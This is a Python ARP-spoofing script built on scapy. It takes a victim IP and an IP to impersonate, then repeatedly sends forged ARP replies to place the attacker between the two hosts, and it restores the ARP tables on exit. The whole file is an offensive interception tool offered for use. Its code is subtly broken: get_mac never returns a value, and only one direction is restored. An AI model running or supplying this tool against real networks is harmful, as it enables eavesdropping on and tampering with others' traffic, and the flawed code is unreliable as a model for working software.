#!/usr/bin/env python3

import optparse
import scapy.all as scapy
import time

def get_options():
    parser = optparse.OptionParser()
    parser.add_option('-s', '--spoof', dest='spoof', help='IP address that will be impostered.')
    parser.add_option('-v', '--victim', dest='victim', help='IP address of the victim computer.')
    (options, arguments) = parser.parse_args()
    if not options.spoof:
        parser.error('[-] Please specify what IP address you want to imposter.')
    if not options.victim:
        parser.error('[-] Please specify the IP address of a victim computer.')
    return options.spoof, options.victim

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether("ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)

(impostered, victim) = get_options()

sent_packets_count = 0
try:
    while True:
        spoof(impostered, victim)
        spoof(victim, impostered)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent " + str(sent_packets_count), end = "")
        time.sleep(0.5)
except KeyboardInterrupt:
    print("\n[+] Restoring ARP tables...")
    restore(impostered, victim)